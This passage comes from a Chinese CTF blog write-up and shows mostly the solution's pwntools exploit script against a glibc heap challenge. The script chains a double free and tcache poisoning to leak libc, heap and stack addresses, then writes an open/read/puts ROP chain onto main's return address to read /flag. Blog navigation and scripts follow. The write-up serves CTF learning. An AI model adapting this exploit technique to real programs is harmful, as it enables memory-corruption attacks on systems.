class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#__author__:N1K0_</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> inspect<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">var</span>):</span><br>    callers_local_vars = inspect.currentframe().f_back.f_locals.items()<br>    temp =  [var_name <span class="hljs-keyword">for</span> var_name, var_val <span class="hljs-keyword">in</span> callers_local_vars <span class="hljs-keyword">if</span> var_val <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]<br>    p.info(temp + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(var))<br><br>s      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>plt     = <span class="hljs-keyword">lambda</span> data               :elf.plt[data]<br>got     = <span class="hljs-keyword">lambda</span> data               :elf.got[data]<br>sym     = <span class="hljs-keyword">lambda</span> data               :libc.sym[data]<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>local_libc_32 = <span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>context.binary = binary<br>elf = ELF(binary,checksec=<span class="hljs-literal">False</span>)<br><br>p = process(binary)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;r&#x27;</span>:<br>        p = remote(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">1</span>)<br>libc = elf.libc<br><span class="hljs-comment"># libc = ELF(remote_libc)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    os.system(<span class="hljs-string">&#x27;tmux set mouse on&#x27;</span>)<br>    context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>    gdb.attach(p,cmd)<br>    pause()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">chunk_list = 0x40A0 </span><br><span class="hljs-string">chunk_list_flag = 0x04060</span><br><span class="hljs-string">gender_chance = 0x4010</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># start </span><br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,sex,name</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;2.Girl:\n&#x27;</span>,<span class="hljs-built_in">str</span>(sex))<br>    sa(<span class="hljs-string">&quot;Please input your child&#x27;s name:\n&quot;</span>,name)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_edit</span>(<span class="hljs-params">idx,name</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;name:&#x27;</span>,name)<br>    ru(<span class="hljs-string">&#x27;Done!\n&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_sex</span>(<span class="hljs-params">idx,sex</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;Current gender:&#x27;</span>)<br>    temp = uu64(r(<span class="hljs-number">6</span>))<br>    sla(<span class="hljs-string">&#x27;2.Girl:&#x27;</span>,<span class="hljs-built_in">str</span>(sex))<br>    <span class="hljs-keyword">return</span> temp<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">content_edit</span>(<span class="hljs-params">idx,data</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;description:&#x27;</span>,data)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br><br><span class="hljs-comment"># ---------------------------- 1 构造double free；泄露libc、heap、environ；将堆块申请到environ泄露stack并计算出main ret</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">6</span>-i)<br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>base = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,<span class="hljs-literal">False</span>)[<span class="hljs-number">-6</span>:]) - <span class="hljs-number">0x1ebbe0</span><br>environ = base + sym(<span class="hljs-string">&#x27;__environ&#x27;</span>)<br>leak(base)<br>leak(environ)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">8</span>)<br>name_edit(<span class="hljs-number">0</span>,p64(environ<span class="hljs-number">-0x10</span>)[:<span class="hljs-number">-1</span>])<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>show(<span class="hljs-number">9</span>)<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,<span class="hljs-literal">False</span>)[<span class="hljs-number">-6</span>:])<br>main_ret = stack_addr - <span class="hljs-number">0x100</span><br>leak(stack_addr)<br>leak(main_ret)<br><br><span class="hljs-comment"># ----------------------------------------2 利用double和tcache poison，将堆块申请到main ret并布置orw chains</span><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Name: &#x27;</span>)<br>heap_addr = uu64(r(<span class="hljs-number">6</span>))<span class="hljs-number">-0xa10</span><br>leak(heap_addr)<br>name_edit(<span class="hljs-number">0</span>,p64(main_ret<span class="hljs-number">-0x10</span>)[:<span class="hljs-number">-1</span>])<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/flag\x00\x00&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aa&#x27;</span>)<br><br>p_rsi_r = base + <span class="hljs-number">0x27529</span><br>p_rdi_r = base + <span class="hljs-number">0x26b72</span><br>p_rdx_r12_r = base + <span class="hljs-number">0x11c371</span><br>open_addr  = base + sym(<span class="hljs-string">&#x27;open&#x27;</span>)<br>read_addr = base + sym(<span class="hljs-string">&#x27;read&#x27;</span>)<br>puts = base + sym(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment"># orw chains</span><br><span class="hljs-comment"># open</span><br>pl = p64(p_rdi_r)+p64(heap_addr+<span class="hljs-number">0x0b20</span>)+p64(p_rsi_r)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br><span class="hljs-comment"># read</span><br>pl+= p64(p_rdi_r)+p64(<span class="hljs-number">4</span>)+p64(p_rsi_r)+p64(heap_addr+<span class="hljs-number">0x3d0</span>)+p64(p_rdx_r12_r)+p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>+p64(read_addr)<br><span class="hljs-comment"># puts</span><br>pl+= p64(p_rdi_r)+p64(heap_addr+<span class="hljs-number">0x3d0</span>)+p64(puts)<br>content_edit(<span class="hljs-number">7</span>,pl)<br><span class="hljs-comment">#------------------------------------------3 trigger</span><br>quit()<br><span class="hljs-comment"># end</span><br>itr()<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://shimo.im/docs/V1hLlJ0RoRkI7Si9">https://shimo.im/docs/V1hLlJ0RoRkI7Si9</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/PWN/">PWN</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/PWN/Glibc/">Glibc</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Glibc/">Glibc</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Heap/">Heap</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ORW/">ORW</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%20%E5%88%9D%E8%B5%9B%20Pwn%20Writeup/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">蓝帽杯2021 初赛 Pwn Writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/01/%E9%9A%8F%E7%AC%94/">
+                        <span class="hidden-mobile">2021 随笔</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#valine",
+          app_id: "BC8977lXvuPHlruJsv3NsMKh-gzGzoHsz",
+          app_key: "U5wynESljzvPrIHxNglF7gF1",
+          placeholder: "Say Something.",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "https://bc8977lx.lc-cn-n1-shared.com",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a><span>谨以此让当下逝去的时光得以隽永.</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
